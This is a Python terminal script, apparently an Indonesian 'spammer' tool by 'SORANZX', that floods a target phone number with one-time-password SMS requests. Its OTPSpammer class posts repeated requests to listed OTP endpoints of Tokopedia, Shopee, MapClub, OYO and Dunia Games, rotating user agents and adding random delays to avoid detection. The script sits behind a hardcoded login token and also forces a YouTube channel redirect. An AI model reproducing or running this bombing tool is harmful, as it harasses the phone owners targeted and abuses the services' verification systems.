#!/usr/bin/env python3
import os
import sys
import time
import requests
import random
from datetime import datetime
import webbrowser
import threading
import json

# Color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    RAINBOW = [RED, YELLOW, GREEN, CYAN, BLUE, PURPLE]
    NEON_GREEN = '\033[92;1m'

def clear_screen():
    os.system('clear')

def typing_effect(text, delay=0.03, color=Colors.WHITE):
    for char in text:
        print(color + char + Colors.END, end='', flush=True)
        time.sleep(delay)
    print()

def animate_loading(text, duration=2):
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    start_time = time.time()
    i = 0
    
    while time.time() - start_time < duration:
        print(f"\r{Colors.CYAN}{chars[i % len(chars)]} {text}{Colors.END}", end="", flush=True)
        time.sleep(0.1)
        i += 1
    
    print(f"\r{Colors.GREEN}✓ {text}{Colors.END}")

def get_current_datetime():
    now = datetime.now()
    return now.strftime("%Y-%m-%d %H:%M:%S")

def get_masked_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        ip = response.json()['ip']
        parts = ip.split('.')
        if len(parts) == 4:
            return f"{parts[0]}.{parts[1]}.{parts[2]}xx"
        return ip
    except:
        return "Unknown"

def show_login_banner():
    clear_screen()
    
    banner_text = [
        "╔══════════════════════════════════════════════╗",
        "║    ██╗      ██████╗  ██████╗ ██╗███╗   ██╗  ║",
        "║    ██║     ██╔═══██╗██╔════╝ ██║████╗  ██║  ║",
        "║    ██║     ██║   ██║██║  ███╗██║██╔██╗ ██║  ║",
        "║    ██║     ██║   ██║██║   ██║██║██║╚██╗██║  ║",
        "║    ███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║  ║",
        "║    ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝  ║",
        "║     ██████╗  █████╗ ██████╗ ███████╗        ║",
        "║     ██╔══██╗██╔══██╗██╔══██╗██╔════╝        ║",
        "║     ██████╔╝███████║██████╔╝█████╗          ║",
        "║     ██╔═══╝ ██╔══██║██╔══██╗██╔══╝          ║",
        "║     ██║     ██║  ██║██║  ██║███████╗        ║",
        "║     ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝        ║",
        "║                                              ║",
        "║           CREATED BY: SORANZX               ║",
        "╚══════════════════════════════════════════════╝"
    ]
    
    for i, line in enumerate(banner_text):
        color = Colors.RAINBOW[i % len(Colors.RAINBOW)]
        print(color + line + Colors.END)
    
    current_dt = get_current_datetime()
    print(f"\n{Colors.CYAN}📅 Date & Time: {current_dt}{Colors.END}")
    print()

def verify_token(token):
    correct_token = "wz6kLgwlKdLBhFwMgZ9bo6DKEq18Dk7vikqkG72So5U8pNVol"
    
    print(f"\n{Colors.YELLOW}[!] Memverifikasi token...{Colors.END}")
    animate_loading("Sedang memverifikasi token", 3)
    
    time.sleep(1)
    
    if token.strip() == correct_token:
        print(f"\n{Colors.GREEN}[✓] Token benar! Login berhasil!{Colors.END}")
        time.sleep(2)
        return True
    else:
        print(f"\n{Colors.RED}[!] Token salah! Coba lagi.{Colors.END}")
        time.sleep(2)
        return False

def show_subscribe_screen():
    clear_screen()
    
    print(f"\n\n{Colors.YELLOW}{Colors.BOLD}{Colors.UNDERLINE}SUBSCRIBE SRZ YT{Colors.END}")
    print(f"\n{Colors.CYAN}[!] Redirecting to YouTube in 3 seconds...{Colors.END}")
    
    for i in range(3, 0, -1):
        print(f"{Colors.GREEN}⏰ {i}...{Colors.END}")
        time.sleep(1)
    
    youtube_url = "https://youtube.com/@soranzxyt?si=pLtmd7g3hX4culGP"
    print(f"\n{Colors.GREEN}[+] Opening YouTube channel...{Colors.END}")
    webbrowser.open(youtube_url)
    
    time.sleep(3)

def create_garou_face():
    garou_art = [
        "╔══════════════════════════════════════════════╗",
        "║           🐺 GAROU FACE - OPM 🐺           ║",
        "╠══════════════════════════════════════════════╣",
        "║                                              ║",
        "║         █████████████████████████           ║",
        "║         ██ 1 1 1 1 1 1 1 1 1 1 ██           ║",
        "║         ██ 0 0 0 0 0 0 0 0 0 0 ██           ║",
        "║         ██ 1 0 1 0 1 0 1 0 1 0 ██           ║",
        "║         ██ 0 1 0 1 0 1 0 1 0 1 ██           ║",
        "║         ██ 1 1 0 0 1 1 0 0 1 1 ██           ║",
        "║         ██ 0 0 1 1 0 0 1 1 0 0 ██           ║",
        "║         ██ 1 0 0 1 0 1 0 1 0 0 ██           ║",
        "║         ██ 0 1 1 0 1 0 1 0 1 1 ██           ║",
        "║         █████████████████████████           ║",
        "║                                              ║",
        "║              HUMAN MONSTER 🌙               ║",
        "╚══════════════════════════════════════════════╝"
    ]
    
    for line in garou_art:
        print(Colors.WHITE + line + Colors.END)

def show_main_dashboard():
    clear_screen()
    create_garou_face()
    
    print(f"\n{Colors.NEON_GREEN}╔══════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.NEON_GREEN}║                 🚀 SPAMMER 🚀                ║{Colors.END}")
    print(f"{Colors.NEON_GREEN}╠══════════════════════════════════════════════╣{Colors.END}")
    
    masked_ip = get_masked_ip()
    current_dt = get_current_datetime()
    
    print(f"{Colors.NEON_GREEN}║ {Colors.CYAN}👤 User IP: {masked_ip}{' '*(33-len(masked_ip))}{Colors.NEON_GREEN}║{Colors.END}")
    print(f"{Colors.NEON_GREEN}║ {Colors.CYAN}📅 Time: {current_dt}{' '*(35-len(current_dt))}{Colors.NEON_GREEN}║{Colors.END}")
    print(f"{Colors.NEON_GREEN}╠══════════════════════════════════════════════╣{Colors.END}")
    print(f"{Colors.NEON_GREEN}║                                              ║{Colors.END}")
    print(f"{Colors.NEON_GREEN}║  {Colors.NEON_GREEN}1. 🎯 MULAI BOT SPAM{Colors.END}{' '*23}{Colors.NEON_GREEN}║{Colors.END}")
    print(f"{Colors.NEON_GREEN}║  {Colors.NEON_GREEN}2. 🔐 MULAI BOT PAIRING CODE{Colors.END}{' '*15}{Colors.NEON_GREEN}║{Colors.END}")
    print(f"{Colors.NEON_GREEN}║  {Colors.NEON_GREEN}3. 💬 SUPPORT ADMIN{Colors.END}{' '*22}{Colors.NEON_GREEN}║{Colors.END}")
    print(f"{Colors.NEON_GREEN}║  {Colors.NEON_GREEN}4. 🚪 KELUAR{Colors.END}{' '*30}{Colors.NEON_GREEN}║{Colors.END}")
    print(f"{Colors.NEON_GREEN}║                                              ║{Colors.END}")
    print(f"{Colors.NEON_GREEN}╚══════════════════════════════════════════════╝{Colors.END}")

class OTPSpammer:
    def __init__(self):
        self.services = {
            "tokopedia": {
                "name": "Tokopedia",
                "urls": [
                    "https://accounts.tokopedia.com/otp/code",
                    "https://ta.tokopedia.com/login"
                ]
            },
            "shopee": {
                "name": "Shopee", 
                "urls": [
                    "https://shopee.co.id/api/v2/otp/send",
                    "https://shopee.co.id/api/v2/authentication/otp_send"
                ]
            },
            "mapclub": {
                "name": "MapClub",
                "urls": [
                    "https://mapclub.com/api/sendOTP",
                    "https://auth.mapclub.com/otp"
                ]
            },
            "oyo": {
                "name": "OYO",
                "urls": [
                    "https://api.oyorooms.com/api/v1/otp/send",
                    "https://auth.oyorooms.com/verify"
                ]
            },
            "duniagames": {
                "name": "Dunia Games",
                "urls": [
                    "https://account.duniagames.co.id/oauth2/otp",
                    "https://api.duniagames.co.id/otp/send"
                ]
            }
        }
        
    def generate_headers(self):
        user_agents = [
            'Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        ]
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
            'Content-Type': 'application/json',
            'Origin': 'https://www.tokopedia.com',
            'Referer': 'https://www.tokopedia.com/',
            'X-Requested-With': 'XMLHttpRequest'
        }
    
    def send_otp_request(self, phone, service_name):
        service = self.services.get(service_name)
        if not service:
            return False
        
        try:
            url = random.choice(service["urls"])
            payload = {
                "phone": phone,
                "country_code": "62",
                "method": "sms",
                "type": "login"
            }
            
            response = requests.post(
                url, 
                json=payload,
                headers=self.generate_headers(),
                timeout=10
            )
            
            return response.status_code in [200, 201, 202]
            
        except:
            return False
    
    def spam_otp(self, phone, count):
        print(f"\n{Colors.GREEN}[+] Memulai spam OTP ke: {phone}{Colors.END}")
        print(f"{Colors.YELLOW}[!] Jumlah spam: {count}{Colors.END}")
        print(f"{Colors.CYAN}[!] Services: Tokopedia, Shopee, MapClub, OYO, Dunia Games{Colors.END}")
        print(f"{Colors.RED}[!] Exit program: Ctrl + Z{Colors.END}\n")
        
        success_count = 0
        failed_count = 0
        
        for i in range(count):
            try:
                service_name = random.choice(list(self.services.keys()))
                service_data = self.services[service_name]
                
                print(f"{Colors.CYAN}[{i+1}/{count}] 📤 Mengirim OTP {service_data['name']}...{Colors.END}", end="")
                
                if self.send_otp_request(phone, service_name):
                    success_count += 1
                    print(f"{Colors.GREEN} ✅ Berhasil{Colors.END}")
                else:
                    failed_count += 1
                    print(f"{Colors.RED} ❌ Gagal{Colors.END}")
                
                # Random delay between requests
                delay = random.uniform(1, 3)
                time.sleep(delay)
                
            except KeyboardInterrupt:
                print(f"\n\n{Colors.RED}[!] Spam dihentikan oleh user!{Colors.END}")
                break
            except Exception as e:
                failed_count += 1
                print(f"{Colors.RED} ❌ Error{Colors.END}")
                continue
        
        return success_count, failed_count

def show_spam_menu():
    clear_screen()
    create_garou_face()
    
    print(f"\n{Colors.NEON_GREEN}╔══════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.NEON_GREEN}║                 🚀 SPAMMER 🚀                ║{Colors.END}")
    print(f"{Colors.NEON_GREEN}╠══════════════════════════════════════════════╣{Colors.END}")
    
    # Creator info
    print(f"{Colors.NEON_GREEN}║ {Colors.YELLOW}Creator: Srz{' '*36}{Colors.NEON_GREEN}║{Colors.END}")
    print(f"{Colors.NEON_GREEN}║ {Colors.YELLOW}YouTube: Soranzx YT{' '*28}{Colors.NEON_GREEN}║{Colors.END}")
    print(f"{Colors.NEON_GREEN}╠══════════════════════════════════════════════╣{Colors.END}")
    
    # User info
    masked_ip = get_masked_ip()
    print(f"{Colors.NEON_GREEN}║ {Colors.CYAN}IP Kamu: {masked_ip}{' '*33}{Colors.NEON_GREEN}║{Colors.END}")
    print(f"{Colors.NEON_GREEN}║ {Colors.CYAN}Pengguna: Active{' '*30}{Colors.NEON_GREEN}║{Colors.END}")
    print(f"{Colors.NEON_GREEN}╠══════════════════════════════════════════════╣{Colors.END}")
    
    # Instructions
    print(f"{Colors.NEON_GREEN}║ {Colors.WHITE}Fitur: Silahkan masukan nomor WA{' '*13}{Colors.NEON_GREEN}║{Colors.END}")
    print(f"{Colors.NEON_GREEN}║ {Colors.WHITE}Nomor harus berawalan +62{' '*22}{Colors.NEON_GREEN}║{Colors.END}")
    print(f"{Colors.NEON_GREEN}║ {Colors.WHITE}Contoh: +6212345678{' '*27}{Colors.NEON_GREEN}║{Colors.END}")
    print(f"{Colors.NEON_GREEN}║ {Colors.WHITE}Jumlah spam: maksimal 20{' '*22}{Colors.NEON_GREEN}║{Colors.END}")
    print(f"{Colors.NEON_GREEN}║ {' '*44}║{Colors.END}")
    print(f"{Colors.NEON_GREEN}╚══════════════════════════════════════════════╝{Colors.END}")
    
    # Get phone number
    phone = input(f"\n{Colors.GREEN}Silahkan masukan nomor WA: {Colors.END}").strip()
    
    if not phone.startswith('+62'):
        print(f"{Colors.RED}[!] Error: Nomor harus berawalan +62!{Colors.END}")
        time.sleep(2)
        return
    
    # Validate phone length
    if len(phone) < 10:
        print(f"{Colors.RED}[!] Error: Nomor terlalu pendek!{Colors.END}")
        time.sleep(2)
        return
    
    # Get spam count
    try:
        count = int(input(f"{Colors.GREEN}Silahkan masukan jumlah spam: {Colors.END}"))
        
        if count > 20:
            print(f"{Colors.RED}[!] Error: Maksimal 20 spam!{Colors.END}")
            time.sleep(2)
            return
        
        if count < 1:
            print(f"{Colors.RED}[!] Error: Minimal 1 spam!{Colors.END}")
            time.sleep(2)
            return
            
    except ValueError:
        print(f"{Colors.RED}[!] Error: Input harus angka!{Colors.END}")
        time.sleep(2)
        return
    
    # Start spam
    spammer = OTPSpammer()
    success, failed = spammer.spam_otp(phone, count)
    
    # Show results
    print(f"\n{Colors.GREEN}╔══════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.GREEN}║                 📊 HASIL SPAM 📊             ║{Colors.END}")
    print(f"{Colors.GREEN}╠══════════════════════════════════════════════╣{Colors.END}")
    print(f"{Colors.GREEN}║ {Colors.CYAN}Target: {phone}{' '*30}{Colors.GREEN}║{Colors.END}")
    print(f"{Colors.GREEN}║ {Colors.GREEN}✅ Berhasil: {success}{' '*28}{Colors.GREEN}║{Colors.END}")
    print(f"{Colors.GREEN}║ {Colors.RED}❌ Gagal: {failed}{' '*30}{Colors.GREEN}║{Colors.END}")
    print(f"{Colors.GREEN}║ {Colors.YELLOW}📊 Total: {success + failed}{' '*29}{Colors.GREEN}║{Colors.END}")
    print(f"{Colors.GREEN}╚══════════════════════════════════════════════╝{Colors.END}")
    
    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")

def show_coming_soon():
    print(f"\n{Colors.YELLOW}[!] Coming Soon!{Colors.END}")
    print(f"{Colors.CYAN}Fitur ini akan segera hadir di update berikutnya!{Colors.END}")
    time.sleep(2)

def login_screen():
    max_attempts = 3
    attempts = 0
    
    while attempts < max_attempts:
        show_login_banner()
        
        print(f"{Colors.YELLOW}[!] Untuk login memerlukan token terlebih dahulu{Colors.END}")
        print(f"{Colors.YELLOW}[!] Dapatkan token di: {Colors.UNDERLINE}https://tinyurl.com/9hakcssp{Colors.END}")
        print()
        
        token = input(f"{Colors.RED}{Colors.BOLD}Masukan token yah ngab:{Colors.END} {Colors.WHITE}")
        
        print(f"{Colors.END}", end="")
        
        if verify_token(token):
            show_subscribe_screen()
            return True
        else:
            attempts += 1
            remaining = max_attempts - attempts
            
            if remaining > 0:
                print(f"{Colors.YELLOW}[!] Sisa percobaan: {remaining}{Colors.END}")
                time.sleep(2)
            else:
                print(f"{Colors.RED}[!] Maximum attempts reached! Exiting...{Colors.END}")
                time.sleep(2)
                sys.exit()
    
    return False

def main():
    try:
        if not login_screen():
            return
        
        while True:
            show_main_dashboard()
            choice = input(f"\n{Colors.NEON_GREEN}Pilih menu [1-4]: {Colors.END}")
            
            if choice == "1":
                show_spam_menu()
            elif choice == "2":
                show_coming_soon()
            elif choice == "3":
                show_coming_soon()
            elif choice == "4":
                print(f"\n{Colors.GREEN}[+] Terima kasih telah menggunakan script!{Colors.END}")
                print(f"{Colors.CYAN}[+] Jangan lupa subscribe SRZ YT!{Colors.END}")
                break
            else:
                print(f"\n{Colors.RED}[!] Pilihan tidak valid!{Colors.END}")
                time.sleep(1)
                
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[!] Script dihentikan{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {str(e)}{Colors.END}")

if __name__ == "__main__":
    main()